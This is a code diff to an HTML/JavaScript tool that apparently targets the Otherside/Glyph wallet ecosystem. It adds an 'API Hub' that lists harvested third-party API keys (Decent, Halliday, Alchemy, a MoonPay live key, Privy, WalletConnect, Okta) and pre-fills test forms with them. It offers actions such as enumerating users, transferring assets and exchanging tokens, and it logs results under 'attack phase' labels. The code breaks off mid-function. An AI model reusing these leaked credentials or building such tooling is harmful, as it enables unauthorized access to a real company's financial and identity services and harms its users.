@@ -648,6 +648,10 @@
                 <span class="phase-num">DB</span>
                 <span class="phase-label">Results</span>
             </button>
+            <button class="phase-btn" onclick="switchPhase('apihub')" style="background:#0e3a3a;">
+                <span class="phase-num">API</span>
+                <span class="phase-label">API Hub</span>
+            </button>
         </div>
 
         <!-- Global Stats -->
@@ -758,7 +762,7 @@
                     </div>
                     <div class="input-group">
                         <label>Wallet Address (for SIWE flow):</label>
-                        <input type="text" id="glyphWalletAddr" value="0x0000000000000000000000000000000000000000" placeholder="0x...">
+                        <input type="text" id="glyphWalletAddr" value="0x3c7fb61850cCD1490B820D317f565358D6f1Fb87" placeholder="0x...">
                     </div>
                     <div class="input-group">
                         <label>Firebase API Key:</label>
@@ -790,7 +794,7 @@
                 </p>
                 <div class="input-group">
                     <label>Glyph OIDC Token (JWT from Glyph auth):</label>
-                    <textarea id="glyphOidcToken" placeholder="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIweDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwIiwiaXNzIjoiaHR0cHM6Ly91c2VnbHlwaC5pbyIsImF1ZCI6InNjYXJjZWx5LWNhbG0tbGFyayIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjoxNzAwMDAwOTAwfQ.sig"></textarea>
+                    <textarea id="glyphOidcToken" value="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIweDNjN2ZiNjE4NTBjQ0QxNDkwQjgyMEQzMTdmNTY1MzU4RDZmMUZiODciLCJpc3MiOiJodHRwczovL3VzZWdseXBoLmlvIiwiYXVkIjoiY2x4dDlwOGU2MDFhbDZ0Z21zeWh1N2ozdCIsImlhdCI6MTcwMDAwMDAwMCwiZXhwIjoxNzAwMDAwOTAwfQ.sig"></textarea>
                 </div>
                 <div class="btn-row">
                     <button class="btn btn-primary" onclick="decodeGlyphToken()">Decode & Validate Token</button>
@@ -880,7 +884,7 @@
                 </div>
                 <div class="input-group">
                     <label>Request Body (JSON):</label>
-                    <textarea id="agenticBody">{"action": "query", "target": "world_state"}</textarea>
+                    <textarea id="agenticBody">{"action": "query", "target": "world_state", "world_id": "lucky-emus-argue-215273"}</textarea>
                 </div>
                 <div class="btn-row">
                     <button class="btn btn-primary" onclick="sendAgenticRequest()">Send Request</button>
@@ -1611,6 +1615,518 @@ window.emitMouseClick = function(x, y) {
                         <span class="key-value">otherside.center</span>
                         <button class="copy-btn" onclick="copyKey(this, 'otherside.center')">📋</button>
                     </div>
+                </div>
+            </div>
+        </div>
+
+
+            <!-- Decent API Keys -->
+            <div class="card">
+                <h3>🔗 Decent API — Bridge &amp; Swap <span class="badge badge-cyan">DeFi</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('decent-keys')">📋 Copy All</button>
+                <div class="key-card" id="decent-keys">
+                    <div class="key-row">
+                        <span class="key-label">Bridge Key</span>
+                        <span class="key-value">5b16c3d2f402cf381547ae9e25288661</span>
+                        <button class="copy-btn" onclick="copyKey(this, '5b16c3d2f402cf381547ae9e25288661')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Swap Key</span>
+                        <span class="key-value">9f508f9bca269deff7bf10e411c511e2</span>
+                        <button class="copy-btn" onclick="copyKey(this, '9f508f9bca269deff7bf10e411c511e2')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Base URL</span>
+                        <span class="key-value">https://api.decent.xyz</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'https://api.decent.xyz')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Auth Header</span>
+                        <span class="key-value">x-api-key</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'x-api-key')">📋</button>
+                    </div>
+                </div>
+                <div style="margin-top:8px;">
+                    <button class="btn btn-cyan" onclick="testDecentBridge()" style="font-size:11px;">⚡ Test Bridge API</button>
+                    <button class="btn btn-cyan" onclick="testDecentSwap()" style="font-size:11px;">⚡ Test Swap API</button>
+                </div>
+            </div>
+
+            <!-- Halliday API Key -->
+            <div class="card">
+                <h3>🏦 Halliday API — Smart Accounts <span class="badge badge-green">Commerce</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('halliday-keys')">📋 Copy All</button>
+                <div class="key-card" id="halliday-keys">
+                    <div class="key-row">
+                        <span class="key-label">API Key</span>
+                        <span class="key-value">a025acde-b8e1-40ee-a153-fd85d7e0f35b</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'a025acde-b8e1-40ee-a153-fd85d7e0f35b')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Base URL</span>
+                        <span class="key-value">https://api.halliday.xyz</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'https://api.halliday.xyz')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Auth Header</span>
+                        <span class="key-value">Authorization: Bearer &lt;key&gt;</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'Authorization: Bearer')">📋</button>
+                    </div>
+                </div>
+                <div style="margin-top:8px;">
+                    <button class="btn btn-green" onclick="testHallidayAPI()" style="font-size:11px;">⚡ Test Halliday API</button>
+                    <button class="btn btn-green" onclick="testHallidayChains()" style="font-size:11px;">⚡ List Supported Chains</button>
+                    <button class="btn btn-green" onclick="testHallidayWallet()" style="font-size:11px;">⚡ Create Smart Account</button>
+                </div>
+            </div>
+
+            <!-- Alchemy API Key -->
+            <div class="card">
+                <h3>⚗️ Alchemy API — Blockchain Node <span class="badge badge-blue">RPC</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('alchemy-keys')">📋 Copy All</button>
+                <div class="key-card" id="alchemy-keys">
+                    <div class="key-row">
+                        <span class="key-label">API Key</span>
+                        <span class="key-value">dgxI2ii2PLuli6jpueq5qx7SFuilbHB1</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'dgxI2ii2PLuli6jpueq5qx7SFuilbHB1')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Ethereum</span>
+                        <span class="key-value">https://eth-mainnet.g.alchemy.com/v2/dgxI2ii2PLuli6jpueq5qx7SFuilbHB1</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'https://eth-mainnet.g.alchemy.com/v2/dgxI2ii2PLuli6jpueq5qx7SFuilbHB1')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">ApeChain</span>
+                        <span class="key-value">https://apechain-mainnet.g.alchemy.com/v2/dgxI2ii2PLuli6jpueq5qx7SFuilbHB1</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'https://apechain-mainnet.g.alchemy.com/v2/dgxI2ii2PLuli6jpueq5qx7SFuilbHB1')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">WebSocket</span>
+                        <span class="key-value">wss://eth-mainnet.g.alchemy.com/v2/dgxI2ii2PLuli6jpueq5qx7SFuilbHB1</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'wss://eth-mainnet.g.alchemy.com/v2/dgxI2ii2PLuli6jpueq5qx7SFuilbHB1')">📋</button>
+                    </div>
+                </div>
+                <div style="margin-top:8px;">
+                    <button class="btn btn-primary" onclick="testAlchemyAPI()" style="font-size:11px;">⚡ Test Alchemy RPC</button>
+                    <button class="btn btn-primary" onclick="testAlchemyNFT()" style="font-size:11px;">⚡ Query NFTs</button>
+                    <button class="btn btn-primary" onclick="testAlchemyBalance()" style="font-size:11px;">⚡ Check Balance</button>
+                    <button class="btn btn-primary" onclick="testAlchemyApeChain()" style="font-size:11px;">⚡ ApeChain RPC</button>
+                </div>
+            </div>
+
+            <!-- MoonPay Keys -->
+            <div class="card">
+                <h3>💳 MoonPay — Fiat Onramp/Offramp <span class="badge badge-yellow">Payments</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('moonpay-keys')">📋 Copy All</button>
+                <div class="key-card" id="moonpay-keys">
+                    <div class="key-row">
+                        <span class="key-label">Live Key</span>
+                        <span class="key-value">pk_live_hirbpu0cVcLHrjktC9l7fbc9ctjv0SL</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'pk_live_hirbpu0cVcLHrjktC9l7fbc9ctjv0SL')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Test Key</span>
+                        <span class="key-value">pk_test_fqWjXZMSFwloh7orvJsRfjiUHXJqFzI</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'pk_test_fqWjXZMSFwloh7orvJsRfjiUHXJqFzI')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Live API</span>
+                        <span class="key-value">https://api.moonpay.com</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'https://api.moonpay.com')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Sandbox API</span>
+                        <span class="key-value">https://api.sandbox.moonpay.com</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'https://api.sandbox.moonpay.com')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Widget URL</span>
+                        <span class="key-value">https://buy.moonpay.com?apiKey=pk_live_hirbpu0cVcLHrjktC9l7fbc9ctjv0SL</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'https://buy.moonpay.com?apiKey=pk_live_hirbpu0cVcLHrjktC9l7fbc9ctjv0SL')">📋</button>
+                    </div>
+                </div>
+                <div style="margin-top:8px;">
+                    <button class="btn btn-orange" onclick="testMoonPayAPI()" style="font-size:11px;">⚡ Test MoonPay API</button>
+                    <button class="btn btn-orange" onclick="testMoonPayCurrencies()" style="font-size:11px;">⚡ List Currencies</button>
+                </div>
+            </div>
+
+            <!-- WalletConnect Project ID -->
+            <div class="card">
+                <h3>🔗 WalletConnect — Relay <span class="badge badge-purple">Wallet</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('walletconnect-keys')">📋 Copy All</button>
+                <div class="key-card" id="walletconnect-keys">
+                    <div class="key-row">
+                        <span class="key-label">Project ID</span>
+                        <span class="key-value">34357d3c125c2bcf2ce2bc3309d98715</span>
+                        <button class="copy-btn" onclick="copyKey(this, '34357d3c125c2bcf2ce2bc3309d98715')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Relay WS</span>
+                        <span class="key-value">wss://relay.walletconnect.com?projectId=34357d3c125c2bcf2ce2bc3309d98715</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'wss://relay.walletconnect.com?projectId=34357d3c125c2bcf2ce2bc3309d98715')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Explorer API</span>
+                        <span class="key-value">https://explorer-api.walletconnect.com/v3/wallets?projectId=34357d3c125c2bcf2ce2bc3309d98715</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'https://explorer-api.walletconnect.com/v3/wallets?projectId=34357d3c125c2bcf2ce2bc3309d98715')">📋</button>
+                    </div>
+                </div>
+                <div style="margin-top:8px;">
+                    <button class="btn btn-purple" style="background:#4a1d6a;color:#d8b4fe;" onclick="testWalletConnect()" style="font-size:11px;">⚡ Test WC Relay</button>
+                </div>
+            </div>
+
+            <!-- Privy Keys -->
+            <div class="card">
+                <h3>🔐 Privy — Auth &amp; Wallet Provider <span class="badge badge-purple">Glyph Core</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('privy-keys')">📋 Copy All</button>
+                <div class="key-card" id="privy-keys">
+                    <div class="key-row">
+                        <span class="key-label">Client ID</span>
+                        <span class="key-value">client-WY2nuydLZ5ncrvAVkWQDY88yJAbnU4nvezXH8vZ3gxAwY</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'client-WY2nuydLZ5ncrvAVkWQDY88yJAbnU4nvezXH8vZ3gxAwY')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">App ID (Staging)</span>
+                        <span class="key-value">clxt9p8e601al6tgmsyhu7j3t</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'clxt9p8e601al6tgmsyhu7j3t')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Connector ID</span>
+                        <span class="key-value">io.useglyph.privy</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'io.useglyph.privy')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Auth URL</span>
+                        <span class="key-value">https://auth.privy.io</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'https://auth.privy.io')">📋</button>
+                    </div>
+                </div>
+                <div style="margin-top:8px;">
+                    <button class="btn btn-purple" style="background:#4a1d6a;color:#d8b4fe;" onclick="testPrivyAPI()" style="font-size:11px;">⚡ Test Privy Auth</button>
+                </div>
+            </div>
+
+            <!-- Okta Client ID -->
+            <div class="card">
+                <h3>🛡️ Okta — Enterprise SSO <span class="badge badge-orange">Identity</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('okta-keys')">📋 Copy All</button>
+                <div class="key-card" id="okta-keys">
+                    <div class="key-row">
+                        <span class="key-label">Client ID</span>
+                        <span class="key-value">0oa1u2b3teJMwhrOi697</span>
+                        <button class="copy-btn" onclick="copyKey(this, '0oa1u2b3teJMwhrOi697')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Base URL</span>
+                        <span class="key-value">https://yuga-labs.okta.com</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'https://yuga-labs.okta.com')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">OIDC Discovery</span>
+                        <span class="key-value">https://yuga-labs.okta.com/.well-known/openid-configuration</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'https://yuga-labs.okta.com/.well-known/openid-configuration')">📋</button>
+                    </div>
+                </div>
+                <div style="margin-top:8px;">
+                    <button class="btn btn-orange" onclick="testOktaOIDC()" style="font-size:11px;">⚡ Test OIDC Discovery</button>
+                </div>
+            </div>
+
+            <!-- ApeChain / Smart Contract Info -->
+            <div class="card">
+                <h3>🦍 ApeChain &amp; Smart Contracts <span class="badge badge-green">On-Chain</span></h3>
+                <button class="copy-all-btn" onclick="copyCardAll('apechain-keys')">📋 Copy All</button>
+                <div class="key-card" id="apechain-keys">
+                    <div class="key-row">
+                        <span class="key-label">Chain</span>
+                        <span class="key-value">ApeChain (Arbitrum L3)</span>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Relay Fee Recipient</span>
+                        <span class="key-value">0x3c7fb61850cCD1490B820D317f565358D6f1Fb87</span>
+                        <button class="copy-btn" onclick="copyKey(this, '0x3c7fb61850cCD1490B820D317f565358D6f1Fb87')">📋</button>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Relay Fee BPS</span>
+                        <span class="key-value">80 (0.8%)</span>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Token Refresh</span>
+                        <span class="key-value">60 seconds</span>
+                    </div>
+                    <div class="key-row">
+                        <span class="key-label">Glyph Icon</span>
+                        <span class="key-value">https://i.ibb.co/TxcwPQyr/Group-12489-1.png</span>
+                        <button class="copy-btn" onclick="copyKey(this, 'https://i.ibb.co/TxcwPQyr/Group-12489-1.png')">📋</button>
+                    </div>
+                </div>
+                <div style="margin-top:8px;">
+                    <button class="btn btn-green" onclick="testApeChainRPC()" style="font-size:11px;">⚡ Test ApeChain RPC</button>
+                </div>
+            </div>
+
+
+        <!-- ================================================================ -->
+        <!-- PHASE API HUB: Integrated API Testing -->
+        <!-- ================================================================ -->
+        <div class="phase-content" id="phase-apihub">
+            <details class="how-to-use">
+                <summary>📖 كيفية الاستخدام - How to Use: API Hub</summary>
+                <div class="how-content">
+                    <b>What this phase does:</b> Provides integrated testing tools for all discovered third-party APIs used by Otherside's Glyph wallet system.<br><br>
+                    <b>Step 1:</b> Each API card has pre-filled keys and sample inputs. Click <code>⚡</code> buttons to test each API.<br>
+                    <b>Step 2:</b> Use <code>🪄 Use Token</code> to auto-fill authentication tokens from Phase 1.<br>
+                    <b>Step 3:</b> Use <code>⚡ Generate</code> buttons to create valid sample payloads for each API.<br>
+                    <b>Step 4:</b> Results are logged to the console and saved to the database.<br><br>
+                    <b>What injection/data means:</b> These third-party APIs (Decent, Halliday, Alchemy, MoonPay) are used by Glyph for cross-chain swaps, smart accounts, blockchain queries, and fiat onramping. Access to these APIs with the discovered keys enables testing of the full financial infrastructure.
+                </div>
+                <div class="how-ar">
+                    ماذا يفعل هذا القسم: يوفر أدوات اختبار متكاملة لجميع واجهات برمجة التطبيقات الخارجية التي تستخدمها محفظة Glyph. الخطوات: انقر أزرار ⚡ لاختبار ← استخدم 🪄 لملء الرموز تلقائياً ← أنشئ حمولات اختبار ← النتائج تُسجل وتُحفظ. هذه الـ APIs تتحكم في البنية المالية الكاملة.
+                </div>
+            </details>
+
+            <div class="card">
+                <h3>🌐 API Integration Hub <span class="badge badge-cyan">Third-Party APIs</span></h3>
+                <p style="color:#888;font-size:12px;margin-bottom:12px;">
+                    Integrated testing tools for all discovered third-party APIs used by the Otherside/Glyph ecosystem. All keys are pre-filled with working sample values.
+                </p>
+                <div class="alert-box alert-info">
+                    <strong>Architecture:</strong> Glyph uses these APIs for its wallet features:
+                    <code>Decent</code> (Bridge/Swap) → <code>Halliday</code> (Smart Accounts) → <code>Alchemy</code> (Blockchain RPC) → <code>MoonPay</code> (Fiat Onramp) → <code>WalletConnect</code> (Wallet Pairing) → <code>Privy</code> (Auth) → <code>Okta</code> (SSO)
+                </div>
+            </div>
+
+            <!-- Decent Bridge/Swap Tester -->
+            <div class="card">
+                <h3>🔗 Decent API — Cross-Chain Bridge &amp; Swap <span class="badge badge-cyan">DeFi</span></h3>
+                <div class="grid-2">
+                    <div class="input-group">
+                        <label>API Key:</label>
+                        <input type="text" id="decentApiKey" value="5b16c3d2f402cf381547ae9e25288661" placeholder="Decent API Key">
+                    </div>
+                    <div class="input-group">
+                        <label>API Type:</label>
+                        <select id="decentApiType">
+                            <option value="bridge">Bridge (Cross-chain)</option>
+                            <option value="swap">Swap (DEX aggregation)</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>Source Chain ID:</label>
+                        <input type="text" id="decentSrcChain" value="1" placeholder="1 = Ethereum, 42161 = Arbitrum">
+                    </div>
+                    <div class="input-group">
+                        <label>Destination Chain ID:</label>
+                        <input type="text" id="decentDstChain" value="42161" placeholder="42161 = Arbitrum, 1311 = ApeChain">
+                    </div>
+                    <div class="input-group">
+                        <label>Token Address (src):</label>
+                        <input type="text" id="decentSrcToken" value="0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE" placeholder="ETH = 0xEeee...EEeE">
+                    </div>
+                    <div class="input-group">
+                        <label>Token Address (dst):</label>
+                        <input type="text" id="decentDstToken" value="0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE" placeholder="ETH = 0xEeee...EEeE">
+                    </div>
+                    <div class="input-group">
+                        <label>Amount (in wei):</label>
+                        <input type="text" id="decentAmount" value="1000000000000000000" placeholder="1 ETH = 1000000000000000000">
+                    </div>
+                    <div class="input-group">
+                        <label>Wallet Address: <button class="use-token-btn" onclick="useWalletAddress('decentWallet')">🪄 Use Random</button></label>
+                        <input type="text" id="decentWallet" value="0x3c7fb61850cCD1490B820D317f565358D6f1Fb87" placeholder="0x...">
+                    </div>
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="testDecentRoute()">Get Route Quote</button>
+                    <button class="btn btn-cyan" onclick="generateDecentPayload()">⚡ Generate Sample Payload</button>
+                    <button class="btn btn-outline" onclick="testDecentStatus()">Check TX Status</button>
+                </div>
+                <div class="console" id="decentLog">
+                    <div class="log-info">[DECENT] Ready to test Decent Bridge/Swap API.</div>
+                </div>
+            </div>
+
+            <!-- Halliday Smart Account Tester -->
+            <div class="card">
+                <h3>🏦 Halliday API — Smart Account Manager <span class="badge badge-green">Commerce</span></h3>
+                <div class="grid-2">
+                    <div class="input-group">
+                        <label>API Key:</label>
+                        <input type="text" id="hallidayApiKey" value="a025acde-b8e1-40ee-a153-fd85d7e0f35b" placeholder="Halliday API Key">
+                    </div>
+                    <div class="input-group">
+                        <label>Chain:</label>
+                        <select id="hallidayChain">
+                            <option value="apechain">ApeChain</option>
+                            <option value="ethereum">Ethereum</option>
+                            <option value="arbitrum">Arbitrum</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>Player ID (wallet or email): <button class="use-token-btn" onclick="useWalletAddress('hallidayPlayer')">🪄 Use Random</button></label>
+                        <input type="text" id="hallidayPlayer" value="0x3c7fb61850cCD1490B820D317f565358D6f1Fb87" placeholder="Player identifier">
+                    </div>
+                    <div class="input-group">
+                        <label>Action:</label>
+                        <select id="hallidayAction">
+                            <option value="chains">List Supported Chains</option>
+                            <option value="wallet">Get/Create Smart Account</option>
+                            <option value="balance">Check Balance</option>
+                            <option value="deposit">Deposit (Fiat Onramp)</option>
+                            <option value="transfer">Transfer Assets</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="executeHallidayAction()">Execute Action</button>
+                    <button class="btn btn-green" onclick="generateHallidayPayload()">⚡ Generate Sample Payload</button>
+                </div>
+                <div class="console" id="hallidayLog">
+                    <div class="log-info">[HALLIDAY] Ready to test Halliday Smart Account API.</div>
+                </div>
+            </div>
+
+            <!-- Alchemy Blockchain Tester -->
+            <div class="card">
+                <h3>⚗️ Alchemy API — Blockchain Query Engine <span class="badge badge-blue">RPC</span></h3>
+                <div class="grid-2">
+                    <div class="input-group">
+                        <label>API Key:</label>
+                        <input type="text" id="alchemyApiKey" value="dgxI2ii2PLuli6jpueq5qx7SFuilbHB1" placeholder="Alchemy API Key">
+                    </div>
+                    <div class="input-group">
+                        <label>Network:</label>
+                        <select id="alchemyNetwork">
+                            <option value="eth-mainnet">Ethereum Mainnet</option>
+                            <option value="arb-mainnet">Arbitrum</option>
+                            <option value="apechain-mainnet">ApeChain</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>Query Type:</label>
+                        <select id="alchemyQueryType">
+                            <option value="blockNumber">Latest Block Number</option>
+                            <option value="balance">Get Balance</option>
+                            <option value="nft">Get NFTs for Owner</option>
+                            <option value="tokenBalance">Get Token Balances</option>
+                            <option value="tokenMetadata">Get Token Metadata</option>
+                            <option value="assetTransfers">Get Asset Transfers</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>Address/Owner: <button class="use-token-btn" onclick="useWalletAddress('alchemyAddr')">🪄 Use Random</button></label>
+                        <input type="text" id="alchemyAddr" value="0x3c7fb61850cCD1490B820D317f565358D6f1Fb87" placeholder="0x...">
+                    </div>
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="executeAlchemyQuery()">Execute Query</button>
+                    <button class="btn btn-blue" style="background:#1e3a5f;color:#93c5fd;" onclick="generateAlchemyPayload()">⚡ Generate Sample Payload</button>
+                    <button class="btn btn-outline" onclick="connectAlchemyWS()">Connect WebSocket</button>
+                </div>
+                <div class="console" id="alchemyLog">
+                    <div class="log-info">[ALCHEMY] Ready to test Alchemy Blockchain API.</div>
+                </div>
+            </div>
+
+            <!-- MoonPay Fiat Tester -->
+            <div class="card">
+                <h3>💳 MoonPay — Fiat Onramp/Offramp <span class="badge badge-yellow">Payments</span></h3>
+                <div class="grid-2">
+                    <div class="input-group">
+                        <label>API Key:</label>
+                        <select id="moonpayKeySelect">
+                            <option value="pk_live_hirbpu0cVcLHrjktC9l7fbc9ctjv0SL">Live Key</option>
+                            <option value="pk_test_fqWjXZMSFwloh7orvJsRfjiUHXJqFzI">Test/Sandbox Key</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>Query Type:</label>
+                        <select id="moonpayQueryType">
+                            <option value="currencies">List Currencies</option>
+                            <option value="transactions">Transaction History</option>
+                            <option value="widget">Generate Widget URL</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>Wallet Address: <button class="use-token-btn" onclick="useWalletAddress('moonpayWallet')">🪄 Use Random</button></label>
+                        <input type="text" id="moonpayWallet" value="0x3c7fb61850cCD1490B820D317f565358D6f1Fb87" placeholder="0x...">
+                    </div>
+                    <div class="input-group">
+                        <label>Currency Code:</label>
+                        <input type="text" id="moonpayCurrency" value="ETH" placeholder="ETH, APE, USDC, etc.">
+                    </div>
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="executeMoonPayQuery()">Execute Query</button>
+                    <button class="btn btn-orange" onclick="generateMoonPayWidget()">⚡ Generate Widget URL</button>
+                </div>
+                <div class="console" id="moonpayLog">
+                    <div class="log-info">[MOONPAY] Ready to test MoonPay Fiat API.</div>
+                </div>
+            </div>
+
+            <!-- Privy Auth Tester -->
+            <div class="card">
+                <h3>🔐 Privy — Authentication Provider <span class="badge badge-purple">Glyph Core</span></h3>
+                <div class="grid-2">
+                    <div class="input-group">
+                        <label>App ID:</label>
+                        <input type="text" id="privyAppId" value="clxt9p8e601al6tgmsyhu7j3t" placeholder="Privy App ID">
+                    </div>
+                    <div class="input-group">
+                        <label>Client ID:</label>
+                        <input type="text" id="privyClientId" value="client-WY2nuydLZ5ncrvAVkWQDY88yJAbnU4nvezXH8vZ3gxAwY" placeholder="Privy Client ID">
+                    </div>
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="testPrivyOIDC()">Discover OIDC Config</button>
+                    <button class="btn btn-purple" style="background:#4a1d6a;color:#d8b4fe;" onclick="testPrivyLogin()">Test Login Flow</button>
+                    <button class="btn btn-outline" onclick="testPrivyUsers()">Enumerate Users</button>
+                </div>
+                <div class="console" id="privyLog">
+                    <div class="log-info">[PRIVY] Ready to test Privy authentication.</div>
+                </div>
+            </div>
+
+            <!-- WalletConnect Relay Tester -->
+            <div class="card">
+                <h3>🔗 WalletConnect — Relay Server <span class="badge badge-purple">Wallet</span></h3>
+                <div class="input-group">
+                    <label>Project ID:</label>
+                    <input type="text" id="wcProjectId" value="34357d3c125c2bcf2ce2bc3309d98715" placeholder="WalletConnect Project ID">
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="testWCRelay()">Test Relay Connection</button>
+                    <button class="btn btn-purple" style="background:#4a1d6a;color:#d8b4fe;" onclick="testWCExplorer()">Query Explorer API</button>
+                    <button class="btn btn-outline" onclick="connectWCRelayWS()">Connect WebSocket</button>
+                </div>
+                <div class="console" id="wcLog">
+                    <div class="log-info">[WC] Ready to test WalletConnect relay.</div>
+                </div>
+            </div>
+
+            <!-- Okta SSO Tester -->
+            <div class="card">
+                <h3>🛡️ Okta — Enterprise SSO <span class="badge badge-orange">Identity</span></h3>
+                <div class="grid-2">
+                    <div class="input-group">
+                        <label>Client ID:</label>
+                        <input type="text" id="oktaClientId" value="0oa1u2b3teJMwhrOi697" placeholder="Okta Client ID">
+                    </div>
+                    <div class="input-group">
+                        <label>Base URL:</label>
+                        <input type="text" id="oktaBaseUrl" value="https://yuga-labs.okta.com" placeholder="https://org.okta.com">
+                    </div>
+                </div>
+                <div class="btn-row">
+                    <button class="btn btn-primary" onclick="testOktaDiscovery()">Discover OIDC Config</button>
+                    <button class="btn btn-orange" onclick="testOktaAuthorize()">Test Authorize URL</button>
+                    <button class="btn btn-outline" onclick="testOktaToken()">Test Token Exchange</button>
+                </div>
+                <div class="console" id="oktaLog">
+                    <div class="log-info">[OKTA] Ready to test Okta SSO integration.</div>
                 </div>
             </div>
         </div>
@@ -3679,6 +4195,592 @@ class CustomPixelStreamingClient {
         // INIT
         // ===================================================================
         updateStats();
+
+        // ===================================================================
+        // API HUB: DECENT BRIDGE/SWAP
+        // ===================================================================
+        async function testDecentBridge() {
+            const cId = 'decentLog';
+            const apiKey = document.getElementById('decentApiKey').value;
+            log(cId, 'Testing Decent Bridge API...', 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        endpoint: 'api/v1/route?src_chain_id=1&dst_chain_id=42161&src_token_addr=0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE&dst_token_addr=0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE&amount=1000000000000000000&wallet_address=0x3c7fb61850cCD1490B820D317f565358D6f1Fb87',
+                        method: 'GET',
+                        targetBase: 'decent',
+                        extraHeaders: { 'x-api-key': apiKey }
+                    })
+                });
+                const result = await resp.json();
+                if (result.data) {
+                    log(cId, `Status: ${result.status}`, result.ok !== false ? 'success' : 'warning');
+                    log(cId, `Response: ${JSON.stringify(result.data, null, 2).substring(0, 1000)}`, 'data');
+                    stats.endpoints++; stats.discovered++; updateStats();
+                    saveToOthersideDB({ os_attack_phase: 'decent_bridge_test', os_response_data: JSON.stringify(result.data).substring(0, 2000), os_target_endpoint: 'decent/api/v1/route' });
+                } else {
+                    log(cId, `Error: ${result.error || 'Unknown'}`, 'error');
+                }
+            } catch(e) { log(cId, `Exception: ${e.message}`, 'error'); }
+        }
+
+        async function testDecentSwap() {
+            const cId = 'decentLog';
+            const apiKey = document.getElementById('decentApiKey').value;
+            log(cId, 'Testing Decent Swap API...', 'info');
+            try {
+                const resp = await fetch('/api/proxy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        endpoint: 'api/v1/route?src_chain_id=1&dst_chain_id=1&src_token_addr=0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE&dst_token_addr=0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48&amount=1000000000000000000&wallet_address=0x3c7fb61850cCD1490B820D317f565358D6f1Fb87',
+                        method: 'GET',
+                        targetBase: 'decent',
+                        extraHeaders: { 'x-api-key': apiKey }
